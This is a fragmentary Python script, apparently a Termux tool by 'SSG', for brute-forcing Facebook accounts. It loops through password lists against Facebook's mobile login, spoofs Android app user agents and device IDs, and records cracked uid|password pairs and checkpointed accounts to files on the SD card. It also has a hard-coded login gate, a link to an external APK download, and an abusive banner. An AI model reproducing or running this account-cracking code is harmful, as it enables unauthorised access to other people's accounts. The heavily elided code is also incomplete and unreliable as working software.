#OPEN SOURCE BY SSG & ALI BANDESHA
#SSG😍
from os import path
...
while attemps < 12345677901:
    ...
    if username == 'SSG' and password == 'COMMANDO':
...
----------------------------------------------
 Author    : SSG
 ☞︎︎︎➪𓅓[🌻𝐎𝐖𝐍𝐄𝐑𝐒/𝐂𝐑𝐄𝐀𝐓🅞︎🅡︎: 𓆩𝐌𝐔𝐁𝐒𝐇𝐀𝐑𓆪🌻𓆩🅐︎🅛︎🅘︎ 🅑︎🅐︎🅝︎🅓︎🅔︎🅢︎🅗︎🅐︎𓆪𓅓☜︎︎︎✍︎     
\033[1;32m\033[1;37m☞  𓆩𝐌𝐔𝐁𝐒𝐇𝐀𝐑𓆪\x1b[38;5;208mAUTHER     \033[1;37m➣   \x1b[38;5;205m𝐌𝐔𝐁𝐒𝐇𝐀𝐑 &    🅐︎🅛︎🅘︎ 🅑︎🅐︎🅝︎🅓︎🅔︎🅢︎🅗︎🅐︎
----------------------------------------------
 FOR HATERS: FUCK YOU YOU WITHOUT CONDAM 🤟
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SSG_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SSG-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SSG-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua ='FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/'+fbbv+';FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/'+fbdv+';FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/'+str(random.randint(111111111,999999999))+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/SSG-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/SSG-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
